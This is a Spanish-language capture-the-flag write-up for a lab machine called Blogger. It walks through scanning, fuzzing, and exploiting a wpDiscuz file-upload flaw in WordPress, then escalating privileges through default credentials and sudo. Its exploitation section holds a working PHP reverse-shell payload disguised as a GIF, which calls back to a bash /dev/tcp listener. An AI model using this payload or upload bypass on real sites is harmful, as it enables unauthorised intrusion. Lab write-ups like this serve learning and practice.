---
layout: single
title: Blogger - Hack Journey
excerpt: "Blogger es una máquina donde estaremos explotando una vulnerabilidad en el gestor de contenido wordpress con la que vamos a lograr acceso al servidor, posteriormente para escalar privilegios tendremos que hacer unos movimientos laterales para cambiar de usuario y obtener el root de la máquina."
date: 2024-10-16
classes: wide
header:
  teaser: /assets/images/hj-writeup-blogger/blogger.png
  teaser_home_page: true
  icon: /assets/images/hj.jpeg
categories:

- hackjourney
- Fácil
- Linux
- Wordpress

tags:

- Fuzzing
- Information Leakage
- CMS Exploitation (Wordpress)
- PHP Reverse Shell (Bypass upload file with GIF)
- Lateral Movement
---

Dificultad: Fácil

Habilidades: 

- Fuzzing
- Information Leakage
- CMS Exploitation (Wordpress)
- PHP Reverse Shell (Bypass upload file with GIF)
- Lateral Movement

![Captura de pantalla (62).png](/assets/images/hj-writeup-blogger/blogger.png)

# IP de la Maquina

10.10.0.5

# Reconocimiento

Comprobando conectividad con la maquina 

```bash
ping -c1 10.10.0.5
```

![ping.png](/assets/images/hj-writeup-blogger/ping.png)

Identificando el sistema operativo lo realizamos con un script en python que en base al TTL nos dice ante que SO nos encontramos.

```bash
wichSystem.py
```

![SO.png](/assets/images/hj-writeup-blogger/SO.png)

# Enumeración

Escaneo de los puertos 

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG scanP 10.10.0.5

# sudo Privilegios de administrador
# -p- Para que escanee todo el rango de puertos disponible (65,535)
# --open Solo muestre los puertos abiertos (no filtrados ni cerrados)
# -sS Aplicamos un tcp Syn port Scan (agilizar el escaneo)
# --min-rate 5000 Agilizar escaneo
# -vvv Nos reporte por consola a medida nos vaya descubriendo cosas
# -n Para que no aplique resolucion DNS (ralentiza el escaneo)
# -Pn (el favorito de todos XD) Para que no aplique descubrimiento de hosts (host discovery)
```

![scanP.png](/assets/images/hj-writeup-blogger/scanP.png)

Vamos a utilizar una serie de scripts básicos de reconocimiento de nmap, detectar las versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito scanS.

```bash
nmap -sCV -p22,80 -oN scanS 10.10.0.5

# -sCV Lanzamos scripts básicos de reconocimiento y detectamos versiones para esos servicios
# -p Indicamos los puertos
# -oN Guardamos en formato nmap o formato normal (tal como se muestra por consola) 
```

![scanS.png](/assets/images/hj-writeup-blogger/scanS.png)

Como únicamente tenemos 2 puertos abiertos, uno es el 22 donde corre el servicio SSH para el cual no tenemos credenciales, Inspeccionando la web un poco, viendo el Código fuente, no logramos encontrar nada relevante.

Usando Wappalyzer  el cual es un Pluggin del navegador, podemos ver las tecnologías con las que esta hecha una web de igual manera con whatweb es lo mismo pero a nivel de consola. No encontramos nada relevante.

![wappalyzer.png](/assets/images/hj-writeup-blogger/wappalyzer.png)

Whatweb

```bash
whatweb http://10.10.0.5
```

![whatweb.png](/assets/images/hj-writeup-blogger/whatweb.png)

Pasamos a lo siguiente, realizar fuzzing sobre la pagina para lograr encontrar directorios ocultos.

Usaremos ffuf para realizar el fuzzing

```bash
ffuf -ic -c -t 200 -fc=404 -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.0.5/FUZZ

# -ic Para ocultar comentarios de los diccionarios
# -c Formato colorizado
# -t Cantidad de hilos 
# -fc Para filtrar (que no nos muestre ese resultado)
# -r Para que siga las redirecciones
# -w Indicar el diccionario  
# -u Indicamos la url
```

![fuzzing.png](/assets/images/hj-writeup-blogger/fuzzing.png)

Gracias al fuzzing encontramos algunos directorios, inspeccionando los directorios, nos encontramos con algo interesante en assets/fonts.

![fuzzing 2.png](/assets/images/hj-writeup-blogger/fuzzing_2.png)

Revisando el directorio encontramos un tipo de blog que al parecer esta hecho en wordpress, pero no tenemos acceso, revisando un poco mas nos encontramos con un subdominio. Tenemos que agregarlo al /etc/hosts para que podamos acceder.

![VirtualHosting.png](/assets/images/hj-writeup-blogger/VirtualHosting.png)

Una vez agregado el subdominio visitamos la web, vemos que esta hecho en wodrpess y analizamos nuevamente con wappalyzer para comprobarlo.

![wordpress.png](/assets/images/hj-writeup-blogger/wordpress.png)

En efecto esta construida con wordpress, ahora que estamos ante un CMS podemos utilizar distintas herramientas para comprobar la seguridad de esta, en este caso usaremos wpscan. Realizando varias pruebas no logramos mediante escaneo pasivo encontrar información sobre pluggins vulnerables pero al cambiar a modo agresivo si logramos identificar varias vulnerabilidades para un plugin en concreto (wpDiscuz), y también identificamos un nombre de usuario j@m3s.

```bash
wpscan --url http://10.10.0.5/assets/fonts/blog/ -e vp,u --plugins-detection aggressive --api-token

# --url Indicamos la url
# -e vp Para que nos detecte pluggins vulnerables y u para que nos identifique posibles usuarios 
# --plugins-detection Cambiar el modo de deteccion de los pluggins, en este caso usamos el agresivo
# --api-token le pasamos la API de wpscan ya que sin esta limita la busqueda de info 
```

![wpdiscuz.png](/assets/images/hj-writeup-blogger/wpdiscuz.png)

# Explotación

Nos encontramos varias vulnerabilidades, realizando varias pruebas la que me funciono fue Unauthenticated Arbitrary File Upload, mediante el sistema de comentarios de un post subir una reverse shell haciendo bypassing de el campo de imágenes, subiendo la revshell como GIF.

![uploadfile.png](/assets/images/hj-writeup-blogger/uploadfile.png)

Contenido de la revshell 

```bash
GIF89a;
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.12/1234 0>&1'"); ?>

#Agregamos la primer linea para que la interprete como GIF
```

Ahora solo necesitamos ingresar a la ruta donde se almacena la revshell, para hacerlo simplemente hacemos clic sobre el archivo, y nos ponemos en escucha con netcat.

![revshell upload.png](/assets/images/hj-writeup-blogger/revshell_upload.png)

Nos ponemos en escucha

```bash
nc -nlvp 1234
```

![nc.png](/assets/images/hj-writeup-blogger/nc.png)

Una vez hecho sucede la magia y conseguimos acceso a la maquina como el usuario www-data

![access.png](/assets/images/hj-writeup-blogger/access.png)

Realizamos un tratamiento de la TTY para poder tener una shell estable y full interactiva.

```bash
script -c bash /dev/null
ctrl + z
stty raw -echo; fg (para traer el proceso de nuevo)
reset xterm
export TERM=xterm
export SHELL=bash

#Le damos las proporciones adecuadas en mi caso 37 filas y 184 columnas
stty rows 37 columns 184

#Listo con esto ya tenemos una shell totalmente interactiva

```

Realizamos un cat al /etc/passwd para ver que usuarios tenemos disponibles

```bash
cat /etc/passwd
```

![passwd.png](/assets/images/hj-writeup-blogger/passwd.png)

Visualizamos los home de cada usuario ya que podemos entrar y dentro de James encontramos el user.txt pero no tenemos permisos para visualizar el archivo.

![user denied.png](/assets/images/hj-writeup-blogger/user_denied.png)

Ahora nos queda realizar escalada de privilegios mediante movimiento lateral intentando cambiar de usuario.

# Escalada de Privilegios

Como observamos tenemos usuarios con nombres por defecto así que probamos credenciales por defecto. y logramos acceder como el usuario vagrant con su pass vagrant.

![vagrant user.png](/assets/images/hj-writeup-blogger/vagrant_user.png)

Ahora comprobamos una serie de comandos para ver de que forma podemos elevar nuestros privilegios. vemos que con el comando sudo -l podemos ejecutar cualquier comando sin proporcionar contraseña.

 

![sudo -l.png](/assets/images/hj-writeup-blogger/sudo_-l.png)

Cambiamos al usuario James para ver el user.txt

![usertxt.png](/assets/images/hj-writeup-blogger/usertxt.png)

Nos encontramos con un archivo que si observamos bien esta codificado en base64. Lo copiamos en nuestra maquina y vemos que contiene el archivo.

![base64 decode.png](/assets/images/hj-writeup-blogger/base64_decode.png)

Nos encontramos con la flag de la maquina, para ganar privilegios máximos, recordemos que con el usuario vagrant podemos ejecutar cualquier comando sin proporcionar la contraseña. Solo ejecutamos sudo root y ganamos privilegios totales sobre la maquina.

![root.png](/assets/images/hj-writeup-blogger/root.png)

Ya con esto hemos completado la maquina. ¡Gracias por leer hasta aquí! Espero que este writeup te haya sido útil para comprender mejor los pasos para resolver esta máquina.  ¡Nos vemos en el próximo reto, y sigue hackeando con ética!

Para agregar como extra si con el usuario vagrant visualizábamos las tareas cron nos encontramos una tarea aparte de las que son por defecto. A l visualizarla vemos que ejecuta un script el usuario root. Intentamos ver el script y logramos hacerlo, el script hace un comprimido del home del usuario james y lo almacena en el directorio /tmp, probamos descomprimir y lo hacemos sin problema, de esta manera también podemos obtener la flag ya que nos muestra el base64.

![cat crontab.png](/assets/images/hj-writeup-blogger/cat_crontab.png)

![vagratnt base64.png](/assets/images/hj-writeup-blogger/vagratnt_base64.png)

Y esta seria otra forma de obtener la flag, solo como dato curioso. Nos vemos
